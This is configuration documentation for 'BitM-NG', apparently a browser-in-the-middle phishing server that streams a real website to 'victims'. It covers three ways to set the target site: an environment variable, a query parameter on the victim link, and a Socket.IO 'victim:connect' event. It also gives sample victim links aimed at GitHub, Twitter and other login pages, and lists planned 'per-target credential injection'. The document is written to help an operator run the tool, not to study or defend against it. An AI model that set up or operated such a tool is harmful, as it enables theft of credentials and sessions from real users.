# Target URL Configuration

The BitM-NG server supports multiple ways to specify which website the browser should navigate to when creating a stream for a victim.

## Configuration Methods

### 1. Environment Variable (Default)

Set the default target URL in your `.env` file:

```bash
BROWSER_DEFAULT_TARGET_URL=https://example.com
```

This will be used if no other method specifies a target URL.

### 2. URL Parameter (Per-Victim)

When a victim connects, you can specify the target URL as a query parameter:

```
https://your-server.com/victim?target=https://example.com
```

The victim client will automatically pass this to the server when connecting.

### 3. Socket.IO Event Parameter

The victim can also specify the target URL when emitting the `victim:connect` event:

```javascript
socket.emit('victim:connect', {
  viewport: { width: 1920, height: 1080 },
  targetUrl: 'https://example.com'
});
```

## Priority Order

The target URL is determined in this order (first match wins):

1. **Socket event parameter** - `targetUrl` in `victim:connect` event
2. **URL query parameter** - `?target=...` in the page URL
3. **Environment variable** - `BROWSER_DEFAULT_TARGET_URL` in `.env`
4. **Hardcoded default** - `https://example.com` (fallback)

## Examples

### Example 1: Using Environment Variable

```bash
# .env
BROWSER_DEFAULT_TARGET_URL=https://www.google.com
```

All victims will connect to Google by default.

### Example 2: Using URL Parameter

```
https://your-server.com/victim?target=https://github.com
```

This victim will see GitHub instead of the default.

### Example 3: Multiple Targets

You can create different links for different targets:

- `https://your-server.com/victim?target=https://example.com/login`
- `https://your-server.com/victim?target=https://github.com/login`
- `https://your-server.com/victim?target=https://twitter.com/login`

## Security Considerations

⚠️ **Important**: The target URL is not validated or sanitized. Make sure to:
- Only allow trusted URLs in production
- Consider implementing URL whitelisting if needed
- Be aware that victims can potentially specify any URL

## Future Enhancements

Future versions may include:
- Target configuration file (`config/targets.json`)
- URL whitelisting/blacklisting
- Target-specific browser settings
- Per-target credential injection

